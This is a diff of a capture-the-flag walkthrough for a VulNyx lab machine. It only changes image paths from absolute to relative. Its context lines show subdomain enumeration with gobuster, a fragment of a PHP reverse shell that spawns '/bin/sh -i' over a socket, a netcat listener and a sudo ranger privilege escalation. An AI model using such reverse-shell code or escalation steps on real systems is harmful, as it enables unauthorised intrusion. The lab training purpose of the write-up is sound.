@@ -139,7 +139,7 @@ securezone.nyx.         604800  IN      SOA     ns1.securezone.nyx. root.securez
 └─$ cat /etc/hosts | grep securezone.nyx
 10.11.5.31 securezone.nyx admin.securezone.nyx upl0ads.securezone.nyx
 ```
-![upload-web](/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/easy_difficulty/07_zone/upload-web.png)
+![upload-web](/walkthroughs/vulnyx/easy_difficulty/07_zone/upload-web.png)
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ gobuster dir -u http://upl0ads.securezone.nyx/ -w /usr/share/wordlists/dirb/common.txt 
@@ -186,7 +186,7 @@ $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
 listening on [any] 4444 ...
 
 ```
-![exploit-web](/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/easy_difficulty/07_zone/exploit-web.png)
+![exploit-web](/walkthroughs/vulnyx/easy_difficulty/07_zone/exploit-web.png)
 
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -232,7 +232,7 @@ User www-data may run the following commands on zone:
     (hans) NOPASSWD: /usr/bin/ranger
 ```
 ##### Shell
-![ranger-exploit](/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/easy_difficulty/07_zone/ranger.png)
+![ranger-exploit](/walkthroughs/vulnyx/easy_difficulty/07_zone/ranger.png)
 
 ```bash
 www-data@zone:/$ sudo -u hans /usr/bin/ranger
